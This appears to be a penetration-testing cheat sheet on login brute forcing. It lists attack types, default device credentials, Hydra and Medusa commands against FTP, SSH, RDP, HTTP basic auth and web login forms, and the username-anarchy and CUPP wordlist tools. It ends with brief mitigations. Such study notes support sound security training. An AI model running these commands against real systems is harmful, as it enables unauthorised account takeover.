## 🎯 Main Idea
- Crack login credentials by systematically trying combinations against services and web logins.
- Understand password security, attack types, and when each is appropriate.
- Drive automated crackers (Hydra, Medusa) against FTP, SSH, RDP, HTTP basic-auth, and web login forms.
- Build smarter, targeted wordlists (usernames + passwords) to improve success rates.

## 💥 Attack / Exploit Vectors
### Brute Force Attack Types
- Choose the attack based on what you know about the password and lockout policy.
- **Concepts**
  - Simple Brute Force — try every character combination (no prior info)
  - Dictionary Attack — try a pre-compiled list of common passwords
  - Hybrid Attack — dictionary words mutated with numbers/symbols
  - Credential Stuffing — reuse leaked credentials from other breaches
  - Password Spraying — one common password across many accounts to dodge lockouts
  - Rainbow Table — reverse hashes with precomputed tables
  - Reverse Brute Force — one known password against many usernames
  - Distributed Brute Force — spread attempts across many machines

### Default Credentials
- Try vendor default username/password pairs first; often never changed.
- **Commands**
  - `admin:admin` (Linksys/TP-Link), `admin:password` (Netgear), `cisco:cisco`, `ubnt:ubnt` — common device defaults

### Hydra - Network Login Cracking
- Fast, parallel, multi-protocol network login cracker.
- **Commands**
  - `hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]` — general syntax
  - `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100` — brute-force FTP
  - `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100` — brute-force SSH

### Basic HTTP Authentication
- Brute-force HTTP Basic Auth (browser popup) prompts.
- **Commands**
  - `medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET` — Medusa HTTP basic auth
  - `hydra ... http-get` — Hydra HTTP basic auth via http-get module

### Login Form Brute Forcing
- Target HTML POST login forms, detecting success/failure by a response string.
- **Commands**
  - `hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` — POST form; `^USER^`/`^PASS^` substituted, `F=` failure string (use `S=` for success string)

### Medusa - Parallel Brute Forcer
- Fast, modular, massively-parallel login brute-forcer across many services.
- **Commands**
  - `medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]` — general syntax
  - `medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh` — brute-force SSH
  - `medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5` — FTP with 5 parallel threads
  - `medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp` — brute-force RDP
  - `medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f` — stop after first valid login (`-f`)

### Web Services Brute Forcing
- Apply the same techniques to web-facing services/APIs and remote-access protocols.
- **Commands**
  - (use Hydra/Medusa modules above against the target service/port)

### Custom Wordlists
- Generate targeted username and password lists from gathered intelligence.
- **Commands**
  - `username-anarchy Jane Smith` — generate usernames for a name
  - `username-anarchy -i names.txt` — generate from a names file (space/CSV/TAB)
  - `username-anarchy -a --country us` — auto-generate from US name dataset
  - `username-anarchy -@ example.com` — append email suffix
  - `cupp -i` — interactive personalized password wordlist from personal info
  - `cupp -w profiles.txt` — build wordlist from a profile file
  - `cupp -l` — download popular lists (e.g. rockyou.txt)

### Password Policy Filtering
- Trim a wordlist to only passwords matching the target's policy, cutting wasted guesses.
- **Commands**
  - `grep -E '^.{8,}$' wordlist.txt` — minimum length (8+)
  - `grep -E '[A-Z]' wordlist.txt` — at least one uppercase
  - `grep -E '[0-9]' wordlist.txt` — at least one digit
  - `grep -v -i 'password' wordlist.txt` — exclude common pattern "password"
  - `grep -E '(.)\1' wordlist.txt` — find consecutive repeated chars (invert with `grep -v`)
  - `grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]'` — combine multiple policy requirements

## 🛠️ Key Tools & Concepts
- Hydra — fast parallel multi-protocol login cracker; `-l`/`-L` user, `-p`/`-P` pass, `-C` combo, http-post-form
- Medusa — modular parallel brute-forcer; `-M` module, `-t` threads, `-f` stop on first hit
- http-post-form — Hydra module; `^USER^`/`^PASS^` placeholders, `F=`/`S=` failure/success markers
- username-anarchy — generate candidate usernames from real names
- CUPP — Common User Passwords Profiler; builds personalized wordlists from OSINT
- rockyou.txt — classic dictionary wordlist for dictionary/hybrid attacks

## 🛡️ Mitigations (only if the module covers them)
- Enforce strong password complexity and minimum length policies
- Account lockout / rate limiting and MFA to defeat automated guessing
- Change all default credentials on devices and software
